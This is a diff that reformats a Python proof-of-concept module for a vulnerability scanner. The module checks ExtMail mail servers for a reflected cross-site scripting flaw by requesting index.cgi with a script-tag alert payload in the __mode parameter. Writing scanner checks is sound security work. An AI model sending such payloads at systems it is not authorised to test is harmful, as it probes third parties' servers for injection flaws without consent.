@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'ExtMail_0003' # 平台漏洞编号，留空
+    vuln_id = 'ExtMail_0003'  # 平台漏洞编号，留空
     name = 'ExtMail 反射型XSS'  # 漏洞名称
     level = VulnLevel.LOW  # 漏洞危害级别
-    type = VulnType.XSS # 漏洞类型
+    type = VulnType.XSS  # 漏洞类型
     disclosure_date = '2012-11-20'  # 漏洞公布时间
     desc = '''     
         广州领立斯网络科技 ExtMail 跨站，伪造登陆框。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'ExtMail'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '73c36a9c-7aa8-4703-b856-30cba29bc69a'
@@ -31,8 +33,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #Refer http://www.wooyun.org/bugs/wooyun-2010-015005
+
+            # Refer http://www.wooyun.org/bugs/wooyun-2010-015005
             hh = hackhttp.hackhttp()
             payload = '/extmail/cgi/index.cgi?__mode=<script>alert(\'testvul\')</script>'
             code, head, res, errcode, _ = hh.http(self.target + payload)
@@ -47,6 +49,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
